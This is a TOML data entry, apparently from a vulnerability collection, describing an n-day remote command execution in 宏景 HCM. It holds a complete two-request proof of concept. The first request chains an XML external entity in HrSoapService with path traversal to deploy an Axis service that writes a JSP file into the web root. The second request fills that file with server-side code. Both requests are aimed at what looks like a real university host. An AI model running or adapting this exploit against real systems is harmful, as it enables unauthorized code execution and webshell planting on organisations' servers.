docs/_data/2023/宏景_宏景hcm命令执行.toml

vendor = "宏景"
name = "宏景HCM命令执行"
type = "RCE"
source = "TG"
date = "08.15"
poc = "第一个包 POST /services/HrSoapService HTTP/2 Host: rlzy.scun.edu.cn Accept-Encoding: gzip,deflate Content-Type: text/xml;charset=UTF-8 Soapaction: \"\" Content-Length: 1225 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY a SYSTEM \"http://127.0.0.1:80/w_selfservice/oauthservlet/%2e%2e/%2e%2e/axisservices/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22randomService%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22..%2Fwebapps%2FROOT%2Fcnvdtest.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment\">]> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:hrs=\"http://www.hjsoft.com.cn/HrSoapService\"> <soapenv:Header/> <soapenv:Body> <hrs:syncProcess> <hrs:in0>aaa &a;</hrs:in0> <hrs:in1>aaa</hrs:in1> <hrs:in2>aaa</hrs:in2> </hrs:syncProcess> </soapenv:Body> </soapenv:Envelope> 第二个包 POST /axisservices/randomService HTTP/2 Host: rlzy.scun.edu.cn Accept-Encoding: gzip,deflate Content-Type: text/xml;charset=UTF-8 Soapaction: \"\" Content-Length: 721 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:util=\"http://util.java\"> <soapenv:Header/> <soapenv:Body> <util:ints soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <in0 xsi:type=\"xsd:int\" xs:type=\"type:int\" xmlns:xs=\"http://www.w3.org/2000/XMLSchema-instance\"><![CDATA[<html> <head> <title>CNVD1</title> </head> <body> Hello Administrator! <% out.println(\"CNVD TEST!\"); %> </body> </html>]]></in0> <in1 xsi:type=\"xsd:int\" xs:type=\"type:int\" xmlns:xs=\"http://www.w3.org/2000/XMLSchema-instance\">?</in1> </util:ints> </soapenv:Body> </soapenv:Envelope>"
label = "nday"
